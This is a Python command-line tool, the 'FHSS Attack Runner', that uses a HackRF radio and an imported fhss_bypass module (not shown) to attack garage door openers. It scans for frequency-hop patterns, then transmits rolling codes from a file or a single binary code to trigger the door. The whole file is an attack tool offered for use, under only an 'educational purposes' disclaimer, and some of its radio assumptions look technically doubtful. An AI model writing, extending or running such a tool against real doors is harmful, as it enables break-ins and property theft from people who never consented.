#!/usr/bin/env python3
"""
FHSS Attack Runner

Command-line tool for executing Frequency Hopping Spread Spectrum attacks against
garage door systems using the fhss_bypass module.

For educational and security research purposes only.
REQUIRES physical HackRF hardware to function.
"""

import os
import sys
import time
import logging
import argparse
import traceback
from typing import List, Dict, Optional, Any
from datetime import datetime

try:
    from fhss_bypass import FHSSBypass
except ImportError as e:
    print(f"Error importing fhss_bypass module: {e}")
    print("Make sure fhss_bypass.py is in the current directory.")
    sys.exit(1)

def setup_logging(log_level: int = logging.INFO):
    """Configure logging for the FHSS attack tool."""
    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    
    # Create logs directory if it doesn't exist
    os.makedirs('logs', exist_ok=True)
    
    # Configure file handler with timestamp
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    log_file = f"logs/fhss_attack_{timestamp}.log"
    
    # Set up logging
    logging.basicConfig(
        level=log_level,
        format=log_format,
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logging.info(f"Logging to {log_file}")

def verify_hardware_availability() -> bool:
    """Verify that HackRF hardware is available."""
    try:
        import hackrf
        logging.info("HackRF module found")
        
        try:
            device = hackrf.HackRF()
            serial = device.serial_number()
            device.close()
            logging.info(f"HackRF device detected: Serial {serial}")
            return True
        except Exception as e:
            logging.error(f"Error connecting to HackRF device: {e}")
            return False
    except ImportError:
        logging.error("HackRF module not available. Install with: pip install hackrf")
        return False

def load_codes_from_file(file_path: str) -> List[str]:
    """
    Load rolling codes from a file.
    
    Args:
        file_path: Path to file containing rolling codes (one per line)
        
    Returns:
        List of code strings
    """
    if not os.path.exists(file_path):
        logging.error(f"File not found: {file_path}")
        return []
    
    try:
        with open(file_path, 'r') as f:
            # Read lines and strip whitespace
            codes = [line.strip() for line in f.readlines()]
            
            # Filter out empty lines
            codes = [code for code in codes if code]
            
            # Validate codes (should be binary strings)
            valid_codes = []
            for code in codes:
                if all(c in '01' for c in code):
                    valid_codes.append(code)
                else:
                    logging.warning(f"Ignoring invalid code: {code}")
            
            logging.info(f"Loaded {len(valid_codes)} valid codes from {file_path}")
            return valid_codes
    except Exception as e:
        logging.error(f"Error loading codes from {file_path}: {e}")
        return []

def main():
    """Main entry point for the FHSS Attack Runner."""
    parser = argparse.ArgumentParser(
        description='FHSS Attack Runner for Garage Door Systems',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    # Main options
    parser.add_argument('-f', '--frequency', type=float, default=433.92,
                      help='Target frequency in MHz')
    parser.add_argument('-b', '--bandwidth', type=float, default=10.0,
                      help='Hop bandwidth in MHz')
    parser.add_argument('-c', '--channels', type=int, default=50,
                      help='Number of frequency channels')
    
    # Analysis options
    parser.add_argument('-a', '--analyze', action='store_true',
                      help='Run full target analysis')
    parser.add_argument('-d', '--duration', type=float, default=20.0,
                      help='Analysis/attack duration in seconds')
    
    # Attack options
    parser.add_argument('--codes', type=str,
                      help='File containing rolling codes to transmit')
    parser.add_argument('--code', type=str,
                      help='Single binary code to transmit')
    parser.add_argument('--type', choices=['sequential', 'fibonacci', 'random', 'auto'],
                      default='auto',
                      help='FHSS system type (if known)')
    
    # Other options
    parser.add_argument('-v', '--verbose', action='store_true',
                      help='Enable verbose output')
    parser.add_argument('--skip-hardware-check', action='store_true',
                      help='Skip hardware check (for development/testing)')
    
    args = parser.parse_args()
    
    # Setup logging
    log_level = logging.DEBUG if args.verbose else logging.INFO
    setup_logging(log_level)
    
    # Display project header
    print("\n========================================")
    print("FHSS Attack Runner for Garage Door Systems")
    print("For educational and security research purposes only.")
    print("========================================\n")
    
    # Check hardware availability
    if not args.skip_hardware_check:
        hardware_available = verify_hardware_availability()
        if not hardware_available:
            print("\nWARNING: HackRF hardware not detected.")
            print("This tool requires actual HackRF hardware to function.")
            print("You can continue without hardware for educational purposes")
            print("by adding the --skip-hardware-check flag.\n")
            choice = input("Continue anyway? (y/n): ")
            if choice.lower() != 'y':
                sys.exit(1)
    
    # Convert MHz to Hz
    target_freq = args.frequency * 1e6
    bandwidth = args.bandwidth * 1e6
    
    # Check if any operation is specified
    if not args.analyze and not args.codes and not args.code:
        logging.error("No operation specified. Use -a/--analyze, --codes, or --code.")
        parser.print_help()
        sys.exit(1)
    
    try:
        # Create the FHSS bypass system
        bypass = FHSSBypass(
            target_frequency=target_freq,
            hop_bandwidth=bandwidth,
            num_channels=args.channels
        )
        
        # Run analysis if requested
        if args.analyze:
            print("\n[1/3] Analyzing FHSS system...")
            print(f"Listening for frequency hops at {args.frequency} MHz ±{args.bandwidth/2} MHz")
            print(f"This will take {args.duration} seconds...\n")
            
            results = bypass.analyze_target(scan_duration=args.duration)
            
            if results["success"]:
                print("\n--- Analysis Results ---")
                print(f"Device type:       {results['device_type']}")
                print(f"Hop pattern:       {results['hop_sequence'][:10]}...")
                print(f"Hop rate:          {results['hop_rate']:.2f} hops/second")
                print(f"Detected channels: {results['detected_channels']}")
                print(f"Channel width:     {results['channel_width']/1000:.1f} kHz")
                print(f"Next predicted hops: {results['predicted_next_hops'][:5]}...")
                print("----------------------\n")
            else:
                print(f"\nAnalysis failed: {results['message']}")
                print("Make sure the garage door remote is actively transmitting during analysis.")
                sys.exit(1)
        
        # Execute attack with codes from file
        if args.codes:
            codes = load_codes_from_file(args.codes)
            
            if not codes:
                logging.error("No valid codes loaded. Check the file format.")
                sys.exit(1)
            
            print(f"\n[2/3] Executing attack with {len(codes)} potential codes...")
            print(f"Target frequency: {args.frequency} MHz")
            print(f"Attack duration: {args.duration} seconds")
            
            # Run a quick analysis if not done already
            if not args.analyze and not bypass.analyzer.current_hop_sequence:
                print("\nPerforming quick hop pattern analysis (5 seconds)...")
                bypass.analyzer.scan_for_hop_pattern(duration=5.0)
            
            result = bypass.execute_rolling_attack(
                codes=codes,
                attack_duration=args.duration
            )
            
            if result:
                print("\nAttack executed successfully!")
            else:
                print("\nAttack execution failed.")
        
        # Execute attack with single code
        if args.code:
            if not all(c in '01' for c in args.code):
                logging.error("Invalid code format. Code must be a binary string (0s and 1s only).")
                sys.exit(1)
            
            print(f"\n[3/3] Transmitting code: {args.code}")
            print(f"Target frequency: {args.frequency} MHz")
            print(f"Transmission duration: {args.duration} seconds")
            
            # Run a quick analysis if not done already
            if not args.analyze and not bypass.analyzer.current_hop_sequence:
                print("\nPerforming quick hop pattern analysis (5 seconds)...")
                bypass.analyzer.scan_for_hop_pattern(duration=5.0)
            
            result = bypass.analyzer.execute_fhss_bypass(
                code=args.code,
                duration=args.duration,
                transmit_power=20.0
            )
            
            if result:
                print("\nCode transmitted successfully!")
            else:
                print("\nTransmission failed.")
        
        print("\nOperation completed.")
        
    except Exception as e:
        logging.error(f"Error: {e}")
        if args.verbose:
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()